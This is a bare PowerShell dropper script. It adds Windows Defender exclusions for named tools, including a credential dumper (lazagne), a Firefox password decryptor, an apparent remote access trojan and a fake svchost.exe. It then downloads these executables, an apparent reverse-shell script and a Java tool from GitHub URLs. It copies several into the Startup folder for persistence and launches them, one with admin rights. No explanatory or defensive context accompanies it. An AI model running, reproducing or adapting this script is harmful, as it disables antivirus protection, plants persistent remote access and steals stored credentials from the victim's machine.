Add-MpPreference -ExclusionProcess "windows10-wifi.exe"
Add-MpPreference -ExclusionProcess "local.exe"
Add-MpPreference -ExclusionProcess "firefox_decrypt.exe"
Add-MpPreference -ExclusionProcess "lazagne.exe"
Add-MpPreference -ExclusionProcess "svchost.exe"
Add-MpPreference -ExclusionProcess "MicrosoftAutoUpdate.exe"
Add-MpPreference -ExclusionProcess "NRATnew.exe"
Add-MpPreference -ExclusionProcess "PersShell.exe"
Add-MpPreference -ExclusionPath "C:\ProgramData\zDATAxD"
Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
mkdir C:\ProgramData\zDATAxD\PersShell
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/PersShell.exe"
$destination = "C:\ProgramData\zDATAxd\PersShell\PersShell.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/PersShell.exe"
$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PersShell.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
cd "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start PersShell.exe -verb runAs
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/svchost.exe"
$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
start svchost.exe
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe"
$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NRATnew.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
start NRATnew.exe
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/lazagne.exe"
$destination = "C:\ProgramData\zDATAxd\PersShell\lazagne.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/local.exe"
$destination = "C:\ProgramData\zDATAxd\PersShell\local.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/windows10-wifi.exe"
$destination = "C:\ProgramData\zDATAxd\PersShell\windows10-wifi.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/firefox_decrypt.exe"
$destination = "C:\ProgramData\zDATAxd\PersShell\firefox_decrypt.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/rev%232.ps1"
$destination = "C:\ProgramData\zDATAxd\rev%232.ps1"
Invoke-WebRequest -Uri $source -OutFile $destination
$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools.jar"
$destination = "C:\ProgramData\zDATAxd\RedTools.jar"
Invoke-WebRequest -Uri $source -OutFile $destination
